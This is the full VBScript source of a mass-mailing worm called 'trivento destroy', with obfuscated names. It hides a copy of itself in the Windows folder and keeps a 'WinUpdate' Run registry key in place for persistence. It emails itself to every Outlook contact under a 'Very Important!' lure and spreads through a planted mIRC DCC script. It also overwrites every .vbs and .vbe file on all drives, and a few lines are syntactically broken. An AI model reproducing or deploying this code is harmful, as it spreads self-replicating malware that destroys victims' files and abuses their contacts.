trivento destroy Created By tabasco. 2/3/2008
Set P78452D7 = createobject("scripting.filesystemobject")
L1SPP471 = P78452D7.getspecialfolder(0)
T903ENCE = L1SPP471 & "\scherzo di carnevale.txt.vb"
Set B24JA6LD = createobject("wscript.shell")
B24JA6LD.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WinUpdate", "wscript.exe " & T903ENCE & " %"
P78452D7.copyfile wscript.scriptfullname, T903ENCE
If B24JA6LD.regread("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\trivento destroy\R6734VNR") <> 1 then
RTQLJ706
End if
If B24JA6LD.regread("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\trivento destroy\HA1C8I43") <> 1 then
A6UT5158 ""
End if

Set EIRL3BAE= P78452D7.opentextfile(wscript.scriptfullname)
L35M08AG = EIRL3BAE.readall
EIRL3BAE.close
Do
if not(P78452D7.fileexists(wscript.scriptfullname)) then
set IC1FESE2= P78452D7.createtextfile(wscript.scriptfullname)
IC1FESE2.write L35M08AG
IC1FESE2.close
end if
I7IH6I38 = B24JA6LD.regread("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WinUpdate")
If I7IH6I38 <> "wscript.exe " & T903ENCE & " %" then
B24JA6LD.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WinUpdate", "wscript.exe " & T903ENCE & " %"
end if
I7IH6I38= ""
loop
Function RTQLJ706()
Set TCT1529N = CreateObject("Outlook.Application")
If TCT1529N = "Outlook" Then
Set GJ319566 = TCT1529N.GetNameSpace("MAPI")
Set JECN86GA = GJ319566.AddressLists
For Each K7D5C2V7 In JECN86GA
If K7D5C2V7.AddressEntries.Count <> 0 Then
H47G4138 = K7D5C2V7.AddressEntries.Count
For A1H1VTEK = 1 To H47G4138
Set F0R7P454 = TCT1529N.CreateItem(0)
Set TE7LTU42 = K7D5C2V7.AddressEntries(A1H1VTEK)
F0R7P454.To = TE7LTU42.Address
F0R7P454.Subject = "Very Important!"
F0R7P454.Body = "Hi:" & vbcrlf & "Please view this file, it's very important." & vbcrlf & ""
execute "set QGQ321M6 =F0R7P454." & Chr(65) & Chr(116) & Chr(116) & Chr(97) & Chr(99) & Chr(104) & Chr(109) & Chr(101) & Chr(110) & Chr(116) & Chr(115)
QEP1IG7E = T903ENCE
F0R7P454.DeleteAfterSubmit = True
QGQ321M6.Add QEP1IG7E
If F0R7P454.To <> "" Then
F0R7P454.Send
End If
Next
End If
Next
End If
End function
Function A6UT5158(G9380PCS)
If G9380PCS <> "" Then
VHN56V2T = B24JA6LD.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
If P78452D7.fileexists("c:\mirc\mirc.ini") Then
G9380PCS = "c:\mirc"
ElseIf P78452D7.fileexists("c:\mirc32\mirc.ini") Then
G9380PCS = "c:\mirc32"
ElseIf P78452D7.fileexists(VHN56V2T & "\mirc\mirc.ini") Then
G9380PCS = VHN56V2T & "\mirc"
ElseIf P78452D7.fileexists(VHN56V2T & "\mirc32\mirc.ini") Then
G9380PCS = VHN56V2T & "\mirc"
Else
G9380PCS = ""
End If
End If
If G9380PCS <> "" Then
Set DQR24JA6 = P78452D7.CreateTextFile(G9380PCS & "\script.ini", True)
DQR24JA6 = "[script]" & vbCrLf & "n0=on 1:JOIN:#:{"
DQR24JA6 = DQR24JA6 & vbCrLf & "n0=on 1:JOIN:#:{"
DQR24JA6 = DQR24JA6 & vbCrLf & "n1=  /if ( $nick == $me ) { halt }"
DQR24JA6 = DQR24JA6 & vbCrLf & "n2=  /." & Chr(100) & Chr(99) & Chr(99) & " send $nick "
DQR24JA6 = DQR24JA6 & T903ENCE
DQR24JA6 = DQR24JA6 & vbCrLf & "n3=}"
script.Close
End If
End Function
Function LV31SPP4()
On Error Resume Next
Set IJ2903EN = P78452D7.Drives
For Each CP86734V In IJ2903EN
N68TQLJ7 = CP86734V & " \ "
Call F2EA1C8I(N68TQLJ7)
Next
End Function

Function F2EA1C8I(DLB6UT51)
KCCIRL3B = DLB6UT51
Set AU535M08 = P78452D7.GetFolder(KCCIRL3B)
Set ARHC1FES = AU535M08.Files
For Each ENL7IH6I In ARHC1FES
If lcase(ENL7IH6I.Name) = "mirc.ini" Then
A6UT5158(ENL7IH6I.ParentFolder)
End If
If P78452D7.GetExtensionName(ENL7IH6I.path) = "vbs"
P78452D7.CopyFile wscript.scriptfullname,ENL7IH6I.path,true
End if
If P78452D7.GetExtensionName(ENL7IH6I.path) = "vbe"
P78452D7.CopyFile wscript.scriptfullname,ENL7IH6I.path,true
End if
Next
Set ML8CT152 = AU535M08.Subfolders
For Each K5PJ3195 In ML8CT152
Call (K5PJ3195.path)
Next
End function
'Vbs by tabasco
